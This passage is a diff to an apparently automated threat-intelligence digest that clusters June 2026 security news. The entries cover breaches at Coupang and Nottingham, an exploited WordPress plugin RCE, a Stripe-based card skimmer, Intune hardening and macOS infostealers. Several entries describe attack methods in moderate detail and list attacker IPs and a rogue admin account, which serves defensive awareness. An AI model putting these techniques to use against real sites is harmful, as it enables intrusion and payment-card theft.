when the company warned that 33.7 million accounts had been compromised . According to South Korean authorities, which took over the investigation, the primary suspect is a 43-year-old Chinese national who worked in Coupang's IT department between 2022 and 2024. Coupang later said that the former employee returned multiple hard drives containing sensitive data. The suspect also disposed of a MacBook Air laptop in a river in an attempt to destroy evidence, but the device was recovered. Coupang also added that the suspect retained user data for approximately 3,000 accounts, even though they accessed millions of accounts, and that this data was deleted from all devices and not transferred to others. SK Telecom, South Korea's largest mobile network operator, also warned customers in April that sensitive USIM data had been exposed after its network was infected with malware. The company later revealed the malware was first deployed on its systems in June 2022, affecting a total of 27 million subscribers (representing SK Telecom's almost entire customer base). Test every layer before attackers do Security teams log 54% of successful attacks and alert on just 14%. The rest move through your environment unseen. The Picus whitepaper shows how breach and attack simulation tests your SIEM and EDR rules so threats stop slipping by detection. Get the whitepaper Related Articles: UK fines LastPass over 2022 data breach impacting 1.6 million users Japanese energy firm loses drive with data of 10.9 million clients Maine breach portal abused to publish fake data breach disclosures Nottingham University data breach affects over 450,000 students ServiceNow discloses security incident exposing customer data
+```
+
+#### Corroborating sources (1)
+
+- **BleepingComputer** (cyber_news_breach_reporting)
+  - Title: Coupang hit with record $409 million data breach fine in Korea
+  - Published: 2026-06-11T12:52:41+00:00
+  - Link: https://www.bleepingcomputer.com/news/security/south-korea-hits-coupang-with-record-409-million-fine-over-data-breach/
+  - Summary: ​​The Personal Information Protection Commission (PIPC), South Korea's data protection regulator, has fined e-commerce giant Coupang a record 624.6 billion won (roughly $409 million) following a massive data breach affecting more than 37 million customers [...]
+
+### Cluster 52dabc044f — score 9
+
+- Title: Nottingham University data breach affects over 450,000 students
+- Source: BleepingComputer (cyber_news_breach_reporting)
+- Published: 2026-06-11T07:27:53+00:00
+- Link: https://www.bleepingcomputer.com/news/security/nottingham-university-data-breach-affects-over-450-000-students/
+- Fetch status: ok
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- threat_categories: active_exploitation, data_breach, ransomware_extortion, supply_chain, zero_day
+- actor_attribution: ShinyHunters
+- affected_industries: education, financial_services
+- urgency_signals: actively_exploited, zero_day
+- content_type: incident_report
+- confidence_tier: tier_4_news
+
+#### Primary article taxonomy
+- threat_categories: ransomware_extortion, supply_chain, zero_day, data_breach, active_exploitation
+- actor_attribution: ShinyHunters
+- affected_industries: financial_services, education
+- urgency_signals: actively_exploited, zero_day
 - content_type: incident_report
 - confidence_tier: tier_4_news
 
@@ -3222,6 +3130,12 @@ Crime The $100 Million Crypto “Looksmaxxing” Boom: How Chinese Cartel Suppli
 
 ```
 The University of Nottingham confirmed on Wednesday that a hacking group gained access to its student records system in a breach affecting both current students and alums. [...]
+```
+
+#### Full body
+
+```
+Nottingham University data breach affects over 450,000 students By Sergiu Gatlan June 11, 2026 03:27 AM 2 The University of Nottingham confirmed on Wednesday that a hacking group gained access to its student records system in a breach affecting both current students and alums. Nottingham University is a public research university with 7,000 staff and over 46,000 students, ranking in the Top 20 in the United Kingdom and the Top 100 worldwide. The university told BleepingComputer in an emailed statement that the incident exposed a "significant amount of data," and that the breach has been reported to the UK's Information Commissioner's Office. "The University of Nottingham has been the victim of a cyber incident and a significant amount of data in our student record system has been accessed by a well-known cybercriminal group", the university said. "We are working with the third party that maintains the platform to lead a forensic investigation." "We take the privacy and security of data that we hold seriously, and we have reported this incident to Action Fraud and the Information Commissioner's Office," it added. While the university has yet to attribute the attack, the ShinyHunters extortion gang claimed responsibility on Tuesday and shared an archive of allegedly stolen documents as proof. In a post on their dark web leak site, the cybercrime group claims to have stolen over 40GB of documents containing student finance data, billing and payment information, credit card and payment details, and campus portal exports from the University of Nottingham and its Malaysia and China campuses Nottingham University on ShinyHunters leak site (BleepingComputer) ShinyHunters also added that the stolen documents contain the affected students' full names, home addresses, IP addresses, phone numbers, and dates of birth. ​After analyzing the leaked data, breach notification service Have I Been Pwned said on Wednesday that the resulting data breach affects 454,600 former and current students, including their "email addresses along with extensive personal information including names, addresses, phone numbers, ethnicities, disabilities, passport numbers and information relating to academic enrolments and fee payments." ShinyHunters' PeopleSoft data theft attacks As BleepingComputer first reported, this attack is part of a widespread data theft campaign in which the ShinyHunters gang has stolen data from over 100 organizations worldwide after breaching their cloud and on-premises Oracle PeopleSoft instances. PeopleSoft is an enterprise business software suite used to manage large-scale operations such as human resources, finance, payroll, supply chain, procurement, and campus administration. ShinyHunters told BleepingComputer that they are using a "gadget chain" of zero-days and old vulnerabilities in the attacks, adding that the attack is not working on all systems, likely because successful exploitation depends on each instance's configuration. BleepingComputer has reached out to Oracle to confirm whether the company is aware of an actively exploited PeopleSoft zero-day but has not yet received a reply. Nottingham University is the second UK university to have disclosed a data breach in recent days, with the University of Oxford revealing last week that its CareerConnect career services platform had been compromised on May 28. Oxford University reported a second data breach in early May following ShinyHunters's breach of Instructure's Canvas learning management system (LMS) . Test every layer before attackers do Security teams log 54% of successful attacks and alert on just 14%. The rest move through your environment unseen. The Picus whitepaper shows how breach and attack simulation tests your SIEM and EDR rules so threats stop slipping by detection. Get the whitepaper Related Articles: Instructure hacker claims data theft from 8,800 schools, universities Charter confirms data breach after ShinyHunters extortion threat 7-Eleven confirms data b
 ```
 
 #### Corroborating sources (1)
@@ -3376,6 +3290,53 @@ Veeam Backup & Replication RCE Flaw Lets Domain Users Run Remote Code  Ravie 
   - Link: https://thehackernews.com/2026/06/veeam-backup-replication-rce-flaw-lets.html
   - Summary: Veeam has released security patches to address a critical flaw in its Backup & Replication software that could result in remote code execution. Tracked as CVE-2026-44963, the vulnerability carries a CVSS score of 9.4 out of a maximum of 10.0. "A vulnerability allowing remote code execution (RCE) on the Backup Server by an authenticated domain user," Veeam said in a Tuesday advisory. It
 
+### Cluster d10717d890 — score 9
+
+- Title: Hackers Exploit Critical Everest Forms Pro WordPress Plugin Flaw to Take Over Sites
+- Source: The Hacker News (cyber_news_breach_reporting)
+- Published: 2026-06-05T08:38:59+00:00
+- Link: https://thehackernews.com/2026/06/hackers-exploit-critical-everest-forms.html
+- Fetch status: ok
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: CVE-2026-3300, WordPress
+
+#### Cluster taxonomy (union across members)
+- affected_industries: financial_services, retail_ecommerce
+- affected_products: WordPress
+- cve_ids: CVE-2026-3300
+- urgency_signals: preauth_unauth
+- content_type: news_report
+- confidence_tier: tier_4_news
+
+#### Primary article taxonomy
+- affected_industries: financial_services, retail_ecommerce
+- affected_products: WordPress
+- cve_ids: CVE-2026-3300
+- urgency_signals: preauth_unauth
+- content_type: news_report
+- confidence_tier: tier_4_news
+
+#### Summary
+
+```
+Threat actors are actively exploiting a critical security flaw in Everest Forms Pro, a WordPress plugin with about 4,000 active installations, to execute arbitrary code, leading to a complete site compromise. The vulnerability in question is CVE-2026-3300 (CVSS score: 9.8), a remote code execution bug impacting all versions of the plugin up to, and including, 1.9.12. A patch for the flaw was
+```
+
+#### Full body
+
+```
+Hackers Exploit Critical Everest Forms Pro WordPress Plugin Flaw to Take Over Sites  Ravie Lakshmanan  Jun 05, 2026 Web Security / Vulnerability Threat actors are actively exploiting a critical security flaw in Everest Forms Pro, a WordPress plugin with about 4,000 active installations, to execute arbitrary code, leading to a complete site compromise. The vulnerability in question is CVE-2026-3300 (CVSS score: 9.8), a remote code execution bug impacting all versions of the plugin up to, and including, 1.9.12. A patch for the flaw was released on March 18, 2026, with version 1.9.13. "This is due to the Calculation Addon's process_filter() function concatenating user-submitted form field values into a PHP code string without proper escaping before passing it to eval()," Wordfence said . "The sanitize_text_field() function applied to input does not escape single quotes or other PHP code context characters. This makes it possible for unauthenticated attackers to inject and execute arbitrary PHP code on the server by submitting a crafted value in any string-type form field (text, email, URL, select, radio) when a form uses the 'Complex Calculation' feature." Successful exploitation of the vulnerability could allow unauthenticated bad actors to execute arbitrary PHP code on the server, permitting them to create rogue administrator accounts, deploy web shells, and open other ways to burrow deeper into the server and establish persistent footholds. According to the WordPress security company, attackers have been observed exploiting the flaw starting April 13, 2026. More than 29,300 exploit attempts targeting the defect have been blocked to date. Of these, 16 attack attempts occurred in the last 24 hours. The most common payload involves attempts to create an administrator account named "diksimarina" (email address: diksimarina@gmail.com) on the compromised site. These attack efforts have originated from the following IP addresses - 202.56.2.126 209.146.60.26 15.235.166.18 2402:1f00:8000:800::40db 185.78.165.153 Skimmer Attacks Exploit Stripe for C2 The disclosure comes as Sansec warned of multiple skimmer campaigns, including one that uses Stripe as a command-and-control (C2) server and a data exfiltration sink in a bid to exploit the reputation of the brand and slip past Content Security Policy rules and network filters. "The attacker treats Stripe as free infrastructure, not a way to launder charges," Sansec noted . "Stripe gives them a writable database for stolen cards and a code-hosting endpoint for the skimmer, both behind a domain that CSP rules and network filters trust by default." The campaign relies on Google Tag Manager (GTM) and Stripe domains - googletagmanager.com and api.stripe.com - which are both trusted implicitly by online stores, with the malicious code loaded from a GTM container and executed on every page that loads it. On Magento and Adobe Commerce checkout pages, it extracts an obfuscated skimmer from a Stripe customer account 's ("cus_TfFjAAZQNOYENR," in this case) metadata field, and saves the financial information, billing and email addresses, and phone numbers entered by unsuspecting users to localStorage . The captured data is then exfiltrated back to the attacker's Stripe account. "Every stolen card becomes a 'customer' in the attacker's account," the e-commerce security company said. "On success, the loader deletes the localStorage entry, so the same record is not sent twice. The attacker lists their stolen cards later by calling the same API with the same key. Stripe's customer database becomes a free, durable exfiltration sink." The Stripe customer record containing the skimmer is said to have been created on December 24, 2025, indicating that the operation may have been active since then. Sansec said it also identified a second variant of the loader that uses Google Firestore instead of Stripe, although the end goal is the same: abuse a trusted service as a covert channel that's unlikely to be bloc
+```
+
+#### Corroborating sources (1)
+
+- **The Hacker News** (cyber_news_breach_reporting)
+  - Title: Hackers Exploit Critical Everest Forms Pro WordPress Plugin Flaw to Take Over Sites
+  - Published: 2026-06-05T08:38:59+00:00
+  - Link: https://thehackernews.com/2026/06/hackers-exploit-critical-everest-forms.html
+  - Summary: Threat actors are actively exploiting a critical security flaw in Everest Forms Pro, a WordPress plugin with about 4,000 active installations, to execute arbitrary code, leading to a complete site compromise. The vulnerability in question is CVE-2026-3300 (CVSS score: 9.8), a remote code execution bug impacting all versions of the plugin up to, and including, 1.9.12. A patch for the flaw was
+
 ### Cluster 8d3bbb4957 — score 9
 
 - Title: Extortion-Only Attacks Increase, With Data Theft Dominating Ransomware Claims
@@ -3454,6 +3415,51 @@ Congress should demand transparency and require the U.S. government to publicly 
   - Link: https://www.justsecurity.org/141830/third-country-deportations-immigrants-risk/?utm_source=rss&utm_medium=rss&utm_campaign=third-country-deportations-immigrants-risk
   - Summary: Congress should demand transparency and require the U.S. government to publicly release third-country deportation agreements, including with the Central African Republic. The post US-Central African Republic Deportation Agreement Escalates Attack on Immigrants and Puts Lives at Risk appeared first on Just Security .
 
+### Cluster 4537ab9a34 — score 8
+
+- Title: Hardening Intune: The Implementation Guide
+- Source: TrustedSec (detection_response_operations)
+- Published: 2026-06-11T04:00:00+00:00
+- Link: https://trustedsec.com/blog/hardening-intune-the-implementation-guide
+- Fetch status: ok
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- threat_categories: phishing_social_eng, zero_day
+- affected_industries: government
+- urgency_signals: zero_day
+- content_type: news_report
+- confidence_tier: tier_2_operator
+
+#### Primary article taxonomy
+- threat_categories: phishing_social_eng, zero_day
+- affected_industries: government
+- urgency_signals: zero_day
+- content_type: news_report
+- confidence_tier: tier_2_operator
+
+#### Summary
+
+```
+<p>Part 2: Step-by-Step Configuration for Every ControlThis is Part 2 of a two-part series on Intune security hardening. Part 1 covers the attacks we have seen against this types of platforms, why platform administration…</p>
+```
+
+#### Full body
+
+```
+Blog Hardening Intune: The Implementation Guide June 11, 2026 Hardening Intune: The Implementation Guide Written by Carlos Perez Incident Response Mobile Security Assessment Table of contents Prerequisites: Microsoft Graph PowerShell Phase 1: Immediate Actions Phase 2: Short-Term Hardening Phase 3: Medium-Term Hardening Phase 4: Detection Appendix: Running the Full Audit Implementation Checklist Closing Thought Part 2: Step-by-Step Configuration for Every Control This is Part 2 of a two-part series on Intune security hardening. Part 1 covers the attacks we have seen against this types of platforms, why platform administration roles are Tier 0 assets, and the controls you need. This post walks you through how to implement each one. In Part 1 , I made the case that these attacks are not an Intune vulnerability, it is a access governance failure. In most incident the attacker compromises an Intune administrator account, created a new Global Admin, and used the platform's built-in remote wipe capability to factory reset devices in the most destructive cases. No malware, no zero-day, just a legitimate management feature executed from a compromised privileged account. I laid out 11 controls and a prioritized quick-win list. This post is the implementation guide. For each control, I will walk through the configuration path, decision points, and a validation test so you can confirm it is working. I am organizing these in the order I would implement them during a hardening engagement, not the order they appeared in Part 1. Implementation Sequence The order matters. Some controls are prerequisites for others, and some produce immediate risk reduction with minimal operational disruption. Here is how I sequence these in engagements: Phase 1: Immediate (Day 1, no dependencies) 1. Audit and remove standing Global Admin and Intune Administrator role assignments 2. Enable PIM on Intune-related roles 3. Enable Multi-Admin Approval for destructive actions 4. Review Graph API app registrations Phase 2: Short-term (Week 1-2, requires planning) 5. Enforce phishing-resistant MFA via Conditional Access authentication strength 6. Configure RBAC custom roles and scope tags 7. Lock down Intune portal access with Conditional Access Phase 3: Medium-term (Week 2-4, requires testing) 8. Deploy Privileged Access Workstations and configure redundancy 9. Enforce script signing and lock down Win32 app deployment 10. Harden device enrollment restrictions Phase 4: Detection (can run in parallel) 11. Deploy Sentinel analytics rule and configure telemetry pipeline Prerequisites: Microsoft Graph PowerShell Throughout this guide, I provide PowerShell commands alongside the portal navigation steps. Some of these are faster and more thorough than clicking through the GUI, especially for auditing and enumeration. You will need the Microsoft Graph PowerShell SDK installed. I have packaged all of the PowerShell in this post as a module of advanced functions: Invoke-IntuneSecurityAudit.ps1 . Download the module, dot-source it, and every function is available with full Get-Help documentation and -Verbose output. # Install the Graph PowerShell SDK (if not already installed) Install-Module Microsoft.Graph -Scope CurrentUser # Dot-source the audit module . .\Invoke-IntuneSecurityAudit.ps1 # Connect with read-only scopes for the audit Connect-IntuneSecurityAudit -Verbose # If you need write scopes later for configuration changes Connect-IntuneSecurityAudit -IncludeWriteScopes -Verbose Every function uses [CmdletBinding()] and Write-Verbose so you can control output verbosity. Use -Verbose to see progress and detail, or omit it for clean pipeline output suitable for Export-Csv or further processing. You will be prompted for permissions when connecting: Figure 1 - Permission Request Phase 1: Immediate Actions 1. Audit and Remove Standing Privileged Access Why this is first: Every other control assumes you know who has privileged access today. You cannot enable PIM on roles that
+```
+
+#### Corroborating sources (1)
+
+- **TrustedSec** (detection_response_operations)
+  - Title: Hardening Intune: The Implementation Guide
+  - Published: 2026-06-11T04:00:00+00:00
+  - Link: https://trustedsec.com/blog/hardening-intune-the-implementation-guide
+  - Summary: <p>Part 2: Step-by-Step Configuration for Every ControlThis is Part 2 of a two-part series on Intune security hardening. Part 1 covers the attacks we have seen against this types of platforms, why platform administration…</p>
+
 ### Cluster 1674209ab9 — score 8
 
 - Title: How to Train Your (Dragons) Analysts - A TrustedSec Guide to Picking the Perfect Purple Team
@@ -3495,12 +3501,12 @@ Blog How to Train Your (Dragons) Analysts - A TrustedSec Guide to Picking the Pe
   - Link: https://trustedsec.com/blog/how-to-train-your-dragons-analysts
   - Summary: <p>Whether it be the advent of AI technologies, new Red-Team techniques and exploits, or new patches and emergent defensive technologies, it’s pretty clear to all of us operating within technology fields that the landscape…</p>
 
-### Cluster 0021e88ebf — score 8
+### Cluster 51fbb1ffa2 — score 8
 
-- Title: Entra Agent ID: The blueprint blast radius
-- Source: Datadog Security Labs (cloud_identity_infrastructure)
-- Published: 2026-06-11T00:00:00+00:00
-- Link: https://securitylabs.datadoghq.com/articles/agent-id-blueprint-blast-radius/
+- Title: What Is Containerization? Security and Best Practices
+- Source: Orca Security Research (cloud_identity_infrastructure)
+- Published: 2026-06-11T13:40:40+00:00
+- Link: https://orca.security/resources/blog/containerization-security/
 - Fetch status: ok
 - Member count: 1
 - Corroborating source count: 1
@@ -3517,22 +3523,22 @@ Blog How to Train Your (Dragons) Analysts - A TrustedSec Guide to Picking the Pe
 #### Summary
 
 ```
-Entra Agent ID is an extension of Entra's application model that provides identities for AI agents. Unlike applications, the agent identity model allows linking a single app registration (blueprint) to multiple identities and their associated privileges, increasing the potential blast radius of a compromised agent.
+Modern applications depend on containers for speed, portability, and scalability. Development teams use containerization to package software consistently across laptops, CI/CD pipelines, Kubernetes clusters, and cloud environments. That flexibility comes with tradeoffs. Containers share a host operating system kernel, which creates a different security model than traditional virtual machines. Risks can emerge from vulnerable images, […]
 ```
 
 #### Full body
 
 ```
-Katie Knowles Senior Security Researcher Key points This post provides technical background about agent identities in Microsoft Entra . The Entra Agent ID framework builds on Entra's application model by using blueprints, blueprint service principals (SPs), agent identities, and agent users. These objects are all subtypes of existing Entra objects (app registrations, SPs, and users). A threat actor who can add a credential to a blueprint can access all agent identities associated with that blueprint, regardless of what tenant they reside in. This is the same risk as using third-party applications, which can lead to incidents like Midnight Blizzard . Unlike applications, the agent identity model allows linking a single app registration (blueprint) to multiple identities (blueprint SPs, agent identities, agent users), and their associated privileges, increasing the potential blast radius of a compromised agent. In this series of blog posts, we'll take an in-depth look at this risk and review security considerations for working with agent identities. Introduction In this post, we share in-depth details on how Entra's agent identity model works on a technical level and the risks associated with it. Microsoft describes Entra Agent ID as an "identity and security framework that extends Microsoft Entra capabilities to AI agents." This framework extends Entra's application model, which uses similar objects in a new architecture to provide application and user identities for agents. Understanding the internals of agent identity is important when considering the blast radius of a potential compromise. Compared to Entra's standard application model, the agent identity model can lead to more total identities and permissions contexts being compromised from a single app registration (blueprint). Just as in the application model, blueprints are analogous to app registrations in that they operate under a producer-consumer model. A blueprint is published in one tenant, but can be used to create agent identities in multiple tenants. This can occur in "agent factory"-type solutions or when an agentic service is used across multiple tenants of the same company. Whoever controls the blueprint controls all agent identities associated with it. This can be devastating if a blueprint you rely on for privileged tasks is compromised. We'll illustrate this risk in depth, and how to defend against it, in the upcoming posts of our series. For now, we'll take a closer look at how agent identities work. We previously covered the application model in depth . If you are new to Entra's application model, you may find it useful to review it as background to this post, since the agent identity model builds on the application model. Anatomy of an agent Entra Agent ID is an extension of Entra's application model that provides identities for AI agents. The agent identity model uses its own types of app registrations ( blueprints ) and SPs ( blueprint principals ), and expands on this model with additional SPs ( agent identities ) and user accounts ( agent users ). Agent identities are already in use in Microsoft's own products as the backbone of services like Copilot Studio and Microsoft Foundry (formerly Azure AI Studio). The agent identity model is similar to Entra's application model and uses similar building blocks. But the similarities end when considering that agent identity was built to provide multiple agent identities out of one app registration, the blueprint. This relationship is different from the application model, which only has one identity (SP) in each tenant where an app registration has been added. To better understand this, let's take a look at how agent identities are architected. Agent identities are created from a single blueprint, which creates a blueprint principal in each tenant where it is installed. Blueprint principals create agent identities and optional agent users (click to enlarge). Note: Currently, the agent identity model is primari
+Table of contents Key takeaways What Is Containerization? Containerization vs. Virtual Machines (VMs) The Components of a Containerized Environment Hardware Host Operating System Container Engine Containerized Applications How Containerization Works Benefits of Containerization Practical Applications of Containerization Deploying Microservices-Based Applications Migrating Legacy Applications to Modern Infrastructure Running Applications Across Hybrid or Multi-Cloud Environments Enabling Consistent Environments for CI/CD Pipelines Supporting Edge Computing and IoT Workloads Popular Containerization Technologies Docker LXC (Linux Containers) Windows Server Containers Kubernetes Containerization Security: Risks and Strategies Common Container Security Risks Container Security Best Practices Securing Containerized Applications at Scale Frequently Asked Questions About Containerization Modern applications depend on containers for speed, portability, and scalability. Development teams use containerization to package software consistently across laptops, CI/CD pipelines, Kubernetes clusters, and cloud environments. That flexibility comes with tradeoffs. Containers share a host operating system kernel, which creates a different security model than traditional virtual machines. Risks can emerge from vulnerable images, exposed secrets, weak access controls, misconfigured orchestration platforms, and insecure runtime settings. Understanding how containerization works is essential for building secure cloud-native applications. This guide explains the fundamentals of containerization, compares containers with virtual machines, examines the technologies behind modern container platforms, and outlines the security controls organizations should implement to reduce risk at scale. Key takeaways Containerization packages an application with its dependencies into an image that runs on a shared host kernel through a container engine. Containers prioritize speed and density over the hardware-isolation model of virtual machines; security controls must match that architecture. A typical production stack spans images, registries, orchestration, and host configuration; weak points appear at each layer. Hardening should reference NIST SP 800-190 and CIS container benchmarks rather than informal checklists. Containerization packages applications with dependencies into portable images that run on a shared host kernel through a container engine. Unlike virtual machines, containers do not ship a full guest OS per workload. Security depends on image provenance, registry controls, orchestrator RBAC, and host hardening. Practitioners map defenses to NIST SP 800-190 and CIS container benchmarks. What Is Containerization? Containerization is a cloud and datacenter workload pattern that encapsulates software and its dependencies in a container image. The image is an immutable artifact storage. At runtime, the engine creates a writable layer. It starts processes inside namespaces and cgroups on Linux. It applies Linux capabilities and seccomp profiles when configured. The Open Container Initiative publishes image and runtime specifications. Engines such as containerd and CRI-O interoperate under Kubernetes. The model matters for security because policy is expressed as code: Dockerfile instructions, admission controllers, and pod security contexts. When those artifacts drift, scanners and auditors surface concrete deltas instead of subjective opinions. Teams that operationalize container security treat those artifacts as part of the attack surface, not as boilerplate. Containerization vs. Virtual Machines (VMs) Containers and virtual machines solve different problems. A VM includes a full guest operating system on virtual hardware provided by a hypervisor. A container shares the host kernel and isolates processes with OS primitives. NIST SP 800-190 Figure 1 illustrates the additional isolation boundary VMs provide versus containers. Dimension Containers Virtual mac
 ```
 
 #### Corroborating sources (1)
 
-- **Datadog Security Labs** (cloud_identity_infrastructure)
-  - Title: Entra Agent ID: The blueprint blast radius
-  - Published: 2026-06-11T00:00:00+00:00
-  - Link: https://securitylabs.datadoghq.com/articles/agent-id-blueprint-blast-radius/
-  - Summary: Entra Agent ID is an extension of Entra's application model that provides identities for AI agents. Unlike applications, the agent identity model allows linking a single app registration (blueprint) to multiple identities and their associated privileges, increasing the potential blast radius of a compromised agent.
+- **Orca Security Research** (cloud_identity_infrastructure)
+  - Title: What Is Containerization? Security and Best Practices
+  - Published: 2026-06-11T13:40:40+00:00
+  - Link: https://orca.security/resources/blog/containerization-security/
+  - Summary: Modern applications depend on containers for speed, portability, and scalability. Development teams use containerization to package software consistently across laptops, CI/CD pipelines, Kubernetes clusters, and cloud environments. That flexibility comes with tradeoffs. Containers share a host operating system kernel, which creates a different security model than traditional virtual machines. Risks can emerge from vulnerable images, […]
 
 ### Cluster dd30076c48 — score 8
 
@@ -3540,18 +3546,20 @@ Katie Knowles Senior Security Researcher Key points This post provides technical
 - Source: Huntress (detection_response_operations)
 - Published: 2026-06-10T14:00:00+00:00
 - Link: https://www.huntress.com/blog/deceptive-installers-macos-infostealers
-- Fetch status: not_attempted
+- Fetch status: ok
 - Member count: 1
 - Corroborating source count: 1
 - Strong signals: Apple iOS/macOS
 
 #### Cluster taxonomy (union across members)
+- threat_categories: phishing_social_eng
 - affected_industries: financial_services
 - affected_products: Apple iOS/macOS
 - content_type: news_report
 - confidence_tier: tier_2_operator
 
 #### Primary article taxonomy
+- threat_categories: phishing_social_eng
 - affected_industries: financial_services
 - affected_products: Apple iOS/macOS
 - content_type: news_report
@@ -3561,6 +3569,12 @@ Katie Knowles Senior Security Researcher Key points This post provides technical
 
 ```
 Deceptive installers disguised as legit macOS software deliver infostealers that grab passwords, cookies, and crypto wallets. Learn how to detect them.
+```
+
+#### Full body
+
+```
+Home Blog The Fake Download That Steals Everything: How Deceptive Installers Are Targeting macOS Users Published: June 10, 2026 The Fake Download That Steals Everything: How Deceptive Installers Are Targeting macOS Users By: Stuart Ashenbrenner Shivangi Pandey If you've ever downloaded a "free" version of software that traditionally has a price tag, I’m looking at you, my LimeWire power-users of the 2000s. You may have unwittingly walked into one of the most effective traps in modern cybercrime. Today, malicious actors are using deceptive installers and weaponized disk images that look completely identical to legitimate software. It has quickly become the undisputed, heavyweight delivery mechanism for macOS malware. macOS malware has a new face We wouldn’t be writing a macOS security blog without calling out the elephant in the room: for decades, the prevailing myth insisted that Macs were inherently safe from malware. That assumption is wildly inaccurate these days. In 2025, over 65% of newly reported macOS malware was classified as infostealers, making credential and data theft one of the most obvious signs that attackers are taking Apple environments quite seriously. What makes these macOS infostealers interesting is how they operate. The vast majority don’t bother trying to establish persistence on the machine. They completely bypass traditional persistence mechanisms, like LaunchAgents or LaunchDaemons . Instead, their playbook is a pure smash-and-grab: Land on the machine. Harvest saved passwords, browser cookies, authentication tokens, and (of course) crypto wallets. Exfiltrate the entire haul to a command-and-control (C2) server before anyone realizes what happened. Because these tools operate with terrifying speed, they don't need to survive a reboot to be successful. As a result, threat actors have shifted the bulk of their engineering efforts away from maintaining a quiet presence on the disk and onto a different phase of the attack: social engineering the initial installation. Anatomy of the attack The infection chain almost always starts inside a web browser. Threat actors lean heavily on search engine optimization (SEO) poisoning to hijack search results, or they seed compromised links across torrent networks and cracked software forums. A user drops their guard, clicks the malicious link, and downloads what they assume is an authentic installer. Figure 1: SEO poisoning leads to a deceptive installer of a fake Arc browser When it comes to deploying software onto a Mac, you’re generally looking at two formats: a package ( .pkg ) file or a disk image ( .dmg ). Packages are usually a headache for threat actors. They require formal developer signing and pack complex background elements, like pre- and post-installation scripts and a bill of materials. Because of that complexity, macOS subjects them to incredibly rigid security scrutiny. Naturally, attackers prefer the path of least resistance, which is why deceptive installers heavily favor the humble disk image ( .dmg ). When a user double-clicks a DMG, macOS mounts it as a virtual drive inside the /Volumes directory—right alongside your primary hard drive at /Volumes/Macintosh HD . Now, Apple designed this virtual mounting methodology to keep the contents of the disk image isolated so it can't alter your internal system files out of the box. It’s a decent speed bump, but it is completely useless the second an attacker tricks a user into waving them past the front door. In a normal, legitimate software installation, a user typically interacts with a familiar split-screen graphic guiding them to do one of two things: drag the application icon into the /Applications folder shortcut, or double-click the app directly from the mounted volume. Figure 2: A legitimate software application guiding the user to drop the application into the Applications folder The moment a legitimate application executes for the first time, it triggers Gatekeeper, Apple’s built-in digital bounc
 ```
 
 #### Corroborating sources (1)
